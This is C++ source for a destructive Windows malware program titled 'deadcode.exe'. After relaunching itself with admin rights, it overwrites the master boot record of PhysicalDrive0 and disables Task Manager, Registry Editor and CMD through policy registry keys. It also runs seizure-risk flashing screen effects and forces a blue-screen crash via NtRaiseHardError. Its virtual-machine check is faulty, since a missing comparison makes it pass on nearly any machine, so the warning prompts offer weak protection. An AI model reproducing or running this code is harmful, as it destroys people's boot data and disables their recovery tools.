#include <windows.h>
#include <mmsystem.h>
#include <functional>
#include <iostream>
#include <cmath>
#include <TlHelp32.h>
#include <string>
#include <fstream>
#include <algorithm>
#include "boot.h"

using namespace std;

#pragma comment(lib, "winmm.lib");
#pragma comment(lib, "gdi32.lib");

typedef NTSTATUS(WINAPI* RtlAdjustPrivilege_t)(ULONG Privilege, BOOL Enable, BOOL CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(WINAPI* NtRaiseHardError_t)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

// --< Sexy Defines >--
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
// --< Sexy Defines >--

// --< Sounds >--
using SndCalc = std::function<char(DWORD)>;

void play(SndCalc calc) {
    HWAVEOUT Wave = 0;
    WAVEFORMATEX Format = {WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0};
    waveOutOpen(&Wave, WAVE_MAPPER, &Format, 0, 0, CALLBACK_NULL);
    char Sound[8000 * 30];

    for (DWORD t = 0; t < sizeof(Sound); ++t) {
		Sound[t] = calc(t);
    }

    WAVEHDR Head = { Sound, sizeof(Sound), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(Wave, &Head, sizeof(WAVEHDR));
    waveOutWrite(Wave, &Head, sizeof(WAVEHDR));
    waveOutUnprepareHeader(Wave, &Head, sizeof(WAVEHDR));
    waveOutClose(Wave);
}

VOID WINAPI sound1() {
	play([](DWORD t) -> char {
        // salinewin.exe first sound remix
        // (remixed by me tho kinda simple)
		return static_cast<char>((t & t>>8) | t >> 4);
	});
}

VOID WINAPI sound2() {
	play([](DWORD t) -> char {
		return static_cast<char>(t & t * (t >> 8 | 40));
	});
}

VOID WINAPI sound3() {
	play([](DWORD t) -> char {
        // Credits: SthephanShi
		return static_cast<char>(t >> (t % 32 ? 4 : 3) | (t % 128 ? t>>3 : t>>3 | t>>9));
	});
}

VOID WINAPI sound4() {
    play([](DWORD t) -> char {
		return static_cast<char>((t >> 4) * (t >> 6) | t >> 2);
	});
}

VOID WINAPI sound5() {
    play([](DWORD t) -> char {
		return static_cast<char>(t * (3 + (1 ^ 5 & t >> 10)) * (t >> 9));
	});
}

VOID WINAPI sound6() {
    play([](DWORD t) -> char {
        // neuro funk style yippie
		return static_cast<char>(t * ((t & 4096 ? t % 65536 < 60000 ? 9 : t & 5 : 12) ^ (42 & t >> 10)) >> (4 & -t >> (t & 512 ? 4 : 8)));
	});
}

VOID WINAPI sound7() {
    play([](DWORD t) -> char {
        // Credits: lhphr
		return static_cast<char>((t >> 10 ^ t >> 11) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64));
	});
}

// --< Sounds >--

// --< Visual >--
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    // wparam 0 to make the compiler shut up
	SendMessageTimeoutW(hwnd, WM_SETTEXT, (WPARAM)0, (LPARAM)L"Spying on you while im dead", SMTO_ABORTIFHUNG, 100, (PDWORD_PTR)NULL);
	return true;
}

DWORD WINAPI titlechanger(LPVOID lpParam) {
    while (true) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
        // lparam to make the compiler shut up
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, (LPARAM)NULL);
	}
}

DWORD WINAPI zoom_right(LPVOID lpParam) {
	int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);
    while (true) {
        HDC Screen = GetDC(0);
        BitBlt(Screen, -30, 0, width, height, Screen, 0, 0, SRCCOPY);
        BitBlt(Screen, width - 30, 0, width, height, Screen, 0, 0, SRCCOPY);
        ReleaseDC(0, Screen);
    }
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC Screen = GetDC(0), 
    Memory = CreateCompatibleDC(Screen);
	int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgb = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = height;

	HBITMAP DibSect = CreateDIBSection(Screen, &bmi, DIB_RGB_COLORS, (void**)&rgb, (HANDLE)NULL, 0);
	SelectObject(Memory, DibSect);

	while (true) {
		Screen = GetDC(0);
		BitBlt(Memory, 0, 0, width, height, Screen, 0, 0, SRCCOPY);
		for (int i = 0; i < width * height; i++) {
			rgb[i].rgb += 480;
		}
		BitBlt(Screen, 0, 0, width, height, Memory, 0, 0, SRCCOPY);
		ReleaseDC(NULL, Screen); 
        DeleteDC(Screen);
	}
}

DWORD WINAPI Furnace(LPVOID lpParam) {
    while (true) {
    	HDC Screen = GetDC(NULL);
    	int width = GetSystemMetrics(0);
        int height = GetSystemMetrics(1);
        int part = rand() % width;
   		BitBlt(Screen, part, 10, 100, width, Screen, part, 0, SRCCOPY);
    	ReleaseDC(NULL, Screen);
	}
}

DWORD WINAPI shader2(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    COLORREF dwTable[] = { 0x690700, 0x973f17, 0x99a529, 0x74bb3b, 0xae6fc7 };

    while (true) {
        HDC Screen = GetDC(0);

        HBRUSH brush = CreateSolidBrush(dwTable[rand() % 6]);
        
        SelectObject(Screen, brush);
        BitBlt(Screen, 0, 0, width, height, Screen, 0, 0, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, Screen);
    }
}

DWORD WINAPI CrazyZoom(LPVOID lpParam) {
	int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);
    while (1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 0, 0, width, height, hdc, -50, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, width, height, hdc, width - 50, 0, SRCCOPY);
        BitBlt(hdc, 0, 0, width, height, hdc, 0, -50, SRCCOPY);
        BitBlt(hdc, 0, 0, width, height, hdc, 0, height - 50, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    while (true) {
        HDC Screen = GetDC(0);
        HBRUSH brush = CreateSolidBrush(((rand() % 256) << 16) | ((rand() % 256) << 8) | (rand() % 256));
        // random yippie

        SelectObject(Screen, brush);
        BitBlt(Screen, 0, 0, width, height, Screen, 0, 0, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, Screen);
    }
}

DWORD WINAPI Shake(LPVOID lpParam) {
    int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    while (true) {
        HDC Screen = GetDC(0);
        BitBlt(Screen, 0, 0, width, height, Screen, -100, 0, SRCCOPY);
        BitBlt(Screen, 0, 0, width, height, Screen, width - 100, 0, SRCCOPY);
        BitBlt(Screen, 0, 0, width, height, Screen, 0, -100, SRCCOPY);
        BitBlt(Screen, 0, 0, width, height, Screen, 0, height - 100, SRCCOPY);
        ReleaseDC(0, Screen);
    }
}

DWORD WINAPI shader4(LPVOID lpParam) {
	int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

	while (true) {
		HDC Screen = GetDC(0),
		Memory = CreateCompatibleDC(Screen);

		HBITMAP Bitmap = CreateCompatibleBitmap(Screen, width, height);
		HGDIOBJ Slc = SelectObject(Memory, Bitmap);
		const BLENDFUNCTION blend = {0, 0, 50, 0};

		BitBlt(Memory, 0, 0, width, height, Screen, 0, 0, SRCCOPY);

		int dx = (rand() % 8) - 4;
		int dy = (rand() % 8) - 4;

		AlphaBlend(Screen, dx, dy, width, height, Memory, 0, 0, width, height, blend);
		
		SelectObject(Memory, Slc);
		DeleteObject(Slc);
		DeleteObject(Bitmap);
		DeleteDC(Memory);
		DeleteDC(Screen);
	}
}

DWORD WINAPI shader5(LPVOID lpParam) {
	while (true) {
		HDC Screen = GetDC(0);
    	int width = GetSystemMetrics(0);
    	int height = GetSystemMetrics(1);
		int stretch = (rand() % 20);
    	StretchBlt(Screen, -10, -10, width + stretch, height + stretch, Screen, 0, 0, width, height, SRCCOPY);
    	StretchBlt(Screen, 10, 10, width - stretch, height - stretch, Screen, 0, 0, width, height, SRCCOPY);
    	ReleaseDC(0, Screen);
	}
}

DWORD WINAPI shader6(LPVOID lpParam) {
	int width = GetSystemMetrics(0);
    int height = GetSystemMetrics(1);

    while (true) {
        HDC Screen = GetDC(NULL);
        HDC Memory = CreateCompatibleDC(Screen);
        HBITMAP Bitmap = CreateCompatibleBitmap(Screen, width, height);
        HGDIOBJ oldBitmap = SelectObject(Memory, Bitmap);

        BitBlt(Memory, 0, 0, width, height, Screen, 0, 0, SRCCOPY);

        BYTE *pixels = (BYTE*)malloc((((24 * width + 31) / 32) * 4) * height);

        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = width;
        bmi.bmiHeader.biHeight = -height;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;

        GetDIBits(Screen, Bitmap, 0, height, pixels, &bmi, DIB_RGB_COLORS);

        float time = GetTickCount() / 1000.0f;
        float waveFrequency = 0.2f;

        BYTE *originalPixels = (BYTE*)malloc((((24 * width + 31) / 32) * 4) * height);
        memcpy(originalPixels, pixels, (((24 * width + 31) / 32) * 4) * height);

        for (int y = 0; y < height; y++) {
            float displacement = sinf(y * waveFrequency + time * 2 * 3.41f) * 20.0f;
            for (int x = 0; x < width; x++) {
                int sourceX = x + (int)displacement;
                if (sourceX < 0) sourceX = 0;
                if (sourceX >= width) sourceX = width -1;

                int destIndex = y * (((24 * width + 31) / 32) * 4) + x *3;
                int srcIndex = y * (((24 * width + 31) / 32) * 4) + sourceX *3;

                pixels[destIndex] = originalPixels[srcIndex];
                pixels[destIndex + 1] = originalPixels[srcIndex +1];
                pixels[destIndex + 2] = originalPixels[srcIndex +2];
            }
        }

        HDC hTargetDC = GetDC(NULL);
        SetDIBits(hTargetDC, Bitmap, 0, height, pixels, &bmi, DIB_RGB_COLORS);

        BitBlt(hTargetDC, 0, 0, width, height, Memory, 0, 0, SRCCOPY);

        SelectObject(Memory, oldBitmap);
        DeleteObject(Bitmap);
        DeleteDC(Memory);
        ReleaseDC(NULL, Screen);
        ReleaseDC(NULL, hTargetDC);
    }
}

DWORD WINAPI shader7(LPVOID lpParam) {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC Screen = GetDC(NULL);
    HDC Memory = CreateCompatibleDC(Screen);
    HBITMAP hScreenBitmap = CreateCompatibleBitmap(Screen, width, height);
    HGDIOBJ oldBitmap = SelectObject(Memory, hScreenBitmap);

    BYTE* pixels = (BYTE*)malloc((((24 * width + 31) / 32) * 4) * height);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    while (true) {
        float time = GetTickCount() / 1000.0f;

        BitBlt(Memory, 0, 0, width, height, Screen, 0, 0, SRCCOPY);
        GetDIBits(Memory, hScreenBitmap, 0, height, pixels, &bmi, DIB_RGB_COLORS);

        for (int y = 0; y <= height; y += 50) {
            float ripple = sinf((y / 50.0f) * 0.5f + time * 2) * 10.0f;
            for (int x = 0; x < width; x++) {
                int yy = y + (int)ripple;
                if (yy >= 0 && yy < height) {
                    int idx = yy * (((24 * width + 31) / 32) * 4) + x * 3;
                    COLORREF color = RGB(
                        (int)((sinf(time + y * 0.1f) * 0.5f + 0.5f) * 255),
                        (int)((sinf(time + y * 0.1f + 2) * 0.5f + 0.5f) * 255),
                        (int)((sinf(time + y * 0.1f + 4) * 0.5f + 0.5f) * 255)
                    );
                    pixels[idx] = GetBValue(color);
                    pixels[idx + 1] = GetGValue(color);
                    pixels[idx + 2] = GetRValue(color);
                }
            }
        }

        for (int x = 0; x <= width; x += 50) {
            float ripple = sinf((x / 50.0f) * 0.5f + time * 2) * 10.0f;
            for (int y = 0; y < height; y++) {
                int xx = x + (int)ripple;
                if (xx >= 0 && xx < width) {
                    int idx = y * (((24 * width + 31) / 32) * 4) + xx * 3;
                    COLORREF color = RGB(
                        (int)((sinf(time + x * 0.1f) * 0.5f + 0.5f) * 255),
                        (int)((sinf(time + x * 0.1f + 2) * 0.5f + 0.5f) * 255),
                        (int)((sinf(time + x * 0.1f + 4) * 0.5f + 0.5f) * 255)
                    );
                    pixels[idx] = GetBValue(color);
                    pixels[idx + 1] = GetGValue(color);
                    pixels[idx + 2] = GetRValue(color);
                }
            }
        }

        SetDIBits(Memory, hScreenBitmap, 0, height, pixels, &bmi, DIB_RGB_COLORS);
        BitBlt(Screen, 0, 0, width, height, Memory, 0, 0, SRCCOPY);
    }
}
// --< Visual >--

// --< Other funcs >--

// this is took from darkcore.exe
bool IsVM() {
    system("wmic computersystem get manufacturer > the_end");
    /*
        i used batch bcz normal way in cpp is Hard and takes a lot of lines
    */
    
    std::ifstream fout("the_end");
    std::string line;
    std::string manufacturer;

    if (fout.is_open())
    {
        getline(fout, line);
        if (getline(fout, line))
        {
            line.erase(std::remove(line.begin(), line.end(), '\n'), line.end());
            line.erase(std::remove(line.begin(), line.end(), '\r'), line.end());

            manufacturer = line;
        }
        fout.close();
    }
    system("del the_end");

    std::transform(manufacturer.begin(), manufacturer.end(), manufacturer.begin(), ::tolower);

    if (manufacturer.find("vmware") != std::string::npos ||
       manufacturer.find("innotek gmbh") || // virtual box <<< 
       manufacturer == "") // mostly windows sandbox has its empty bcz wmic doesnt exist on it
        return true;

    return false;
}

bool IsAdmin() {
    BOOL admin;
    PSID adminSid;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&ntAuth, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminSid);
    CheckTokenMembership(NULL, adminSid, &admin);
    FreeSid(adminSid);
    return admin == true;
}

void RepMBR1() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    DWORD dwBytesWritten = 0;
    BOOL result = WriteFile(hDevice, boot1, 512UL, &dwBytesWritten, NULL);
    CloseHandle(hDevice);
}

void RepMBR2() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    DWORD dwBytesWritten = 0;
    BOOL result = WriteFile(hDevice, boot2, 512UL, &dwBytesWritten, NULL);
    CloseHandle(hDevice);
}

void Remove_Usefull() {    
    HKEY hKey;
    DWORD one = 1;
    DWORD two = 2;

    // -< Task Manager >-
    RegCreateKeyExW(
        HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);

    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (CONST BYTE *)&one, sizeof(one));

    // -< Registry Editor >-
    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (CONST BYTE *)&one, sizeof(one));
    
    // -< CMD >-
    RegCreateKeyExW(
        HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\System",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);

    RegSetValueExW(hKey, L"DisableCMD", 0, REG_DWORD, (CONST BYTE *)&two, sizeof(two));
    RegCloseKey(hKey);
}

// --< Other funcs >--

int main() {
    if (!IsVM()) {
        MessageBoxW(NULL, L"Why the hell you wanna run this on a real machine", L". . .", MB_YESNO | MB_ICONEXCLAMATION);
        ExitProcess(0);
    }

    if (!IsAdmin()) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOWNORMAL);
        return 0;
    }

    if (MessageBoxW(NULL, 
        L"This program is a malware, it will wipe off your VM data\nContinue?", 
        L"deadcode.exe By chinawillspyonusa", 
        MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }

    if (MessageBoxW(NULL, 
        L"The malware also has flashing Lights\nIf you know to have photosensitive epilepsy then click off\nContinue?", 
        L"deadcode.exe By chinawillspyonusa", 
        MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }

    HANDLE titles = CreateThread(0, 0, titlechanger, 0, 0, 0);
    RepMBR1();
    Sleep(5000);
    sound1();
	HANDLE zoomr = CreateThread(0, 0, zoom_right, 0, 0, 0);
    HANDLE shader_1 = CreateThread(0, 0, shader1, 0, 0, 0);
    Sleep(30000);
    TerminateThread(shader_1, 0);
    sound2();
	HANDLE frn = CreateThread(0, 0, Furnace, 0, 0, 0);
    HANDLE shader_2 = CreateThread(0, 0, shader2, 0, 0 ,0);
    Sleep(30000);
    TerminateThread(shader_2, 0);
	sound3();
	HANDLE cr = CreateThread(0, 0, CrazyZoom, 0, 0, 0);
    HANDLE shke = CreateThread(0, 0, Shake, 0, 0, 0);
    HANDLE shader_3 = CreateThread(0, 0, shader3, 0, 0, 0);
    Sleep(30000);
    TerminateThread(shader_3, 0);
	TerminateThread(shke, 0);
    TerminateThread(cr, 0);
    TerminateThread(frn, 0);
    TerminateThread(zoomr, 0);
    sound4();
    HANDLE shader_4 = CreateThread(0, 0, shader4, 0, 0, 0);
    Sleep(30000);
	sound5();
    HANDLE shader_5 = CreateThread(0, 0, shader5, 0, 0, 0);
    Sleep(30000);
    TerminateThread(shader_5, 0);
	sound6();
    HANDLE shader_6 = CreateThread(0, 0, shader6, 0, 0, 0);
	HANDLE shader3restart = CreateThread(0, 0, shader3, 0, 0, 0);
    Sleep(30000);
    TerminateThread(shader_6, 0);
    sound7();
    HANDLE shader_7 = CreateThread(0, 0, shader7, 0, 0, 0);
    RepMBR2();
    Sleep(30000);
    
    BOOLEAN Bool;
    DWORD Res;
    NRHEdef NtRaiseHardError_t = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege_t = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege_t(19, 1, 0, &Bool);
    NtRaiseHardError_t(0xC0000145, 0, 0, 0, 6, &Res);
}
